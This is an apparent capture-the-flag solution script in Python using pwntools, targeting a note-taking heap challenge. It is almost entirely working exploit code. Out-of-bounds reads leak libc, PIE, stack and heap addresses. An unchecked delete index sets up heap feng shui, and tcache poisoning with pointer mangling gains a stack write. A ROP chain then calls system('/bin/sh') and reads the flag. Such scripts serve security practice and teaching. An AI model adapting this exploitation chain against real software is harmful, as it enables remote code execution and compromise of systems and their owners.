#!/usr/bin/env python3

from pwn import *

exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def create(siz, note):
	sla(b"> ", b"1")
	sla(b"> ", f"{siz}".encode())
	sla(b"note: ", note)

def modify(idx, siz, note):
	sla(b"> ", b"3")
	sla(b"> ", f"{idx}".encode())
	sla(b"> ", f"{siz}".encode())
	sla(b"note: ", note)

def read(idx):
	sla(b"> ", b"2")
	sla(b"> ", f"{idx}".encode())

def delete(idx):
	sla(b"> ", b"4")
	sla(b"> ", f"{idx}".encode())

def u2long(val):
	if(val >= (1 << 63)):
		val = val - (1 << 64)
	return val


script = '''
init-pwndbg
brva 0x15F0
brva 0x1399
'''

# p = remote("iloverust.challs.pwnoh.io", 1337, ssl = True)
#p = process('./chall_patched')
p = gdb.debug('./chall_patched', gdbscript = script)

# leak libc and pie
read(-0xe)
rcu(b"Note: ")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['_IO_2_1_stdout_']
read(-0x2)
rcu(b"Note: ")
code_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x4060
lleak("libc_base", libc_base)
lleak("code_base", code_base)

# leak stack
notes = code_base + 0x4080
environ_ptr = libc_base + 0x202fa0
tmp = 0x8000000000000000 + ((environ_ptr - notes) >> 4)
read(u2long(tmp))
rcu(b"Note: ")
environ_val = u64(p.recv(6).ljust(8, b"\x00"))
lleak("environ value", environ_val)

# leak heap
topchunk_ptr = libc_base + 0x203b30
tmp = 0x8000000000000000 + ((topchunk_ptr - notes) >> 4)
read(u2long(tmp))
rcu(b"Note: ")
topchunk = u64(p.recv(6).ljust(8, b"\x00"))
lleak("top chunk", topchunk)

# look in ida, the delete function doesnt check bound of idx? wtf???
# so all previous work are not essential

# fengshui
payload = p64(topchunk + 0x30) # fake pointer
payload += p32(0x4141) # fake size
tmp = (topchunk + 0x10 - notes) // 0x10
payload += p32(tmp & 0xffffffff) # fake id
payload += p64(0) + p64(0x41)
create(0x38, payload)

create(0x38, b"0" * 8)
create(0x38, b"1" * 8)

delete(2)
delete(1)
delete(tmp) # this is important


# tcache poisoning
rsp_create = environ_val - 0x1c8
mangle = (rsp_create + 0x20)  ^ (topchunk + 0x50) >> 12
create(0x38, b"2" * 0x18 + p64(0x41) + p64(mangle))

# rop
create(0x38, b"3" * 8)
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
pop_rdi = libc_base + 0x000000000010f78b
ret = pop_rdi + 1
payload = p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
create(0x38, b"A" * 8 + payload)

#debug()

sleep(0.3)
sl(b"cat flag.txt")

p.interactive()
#bctf{NULL_p01nter_expl01tat10n_also_btw_i_also_love_rust}
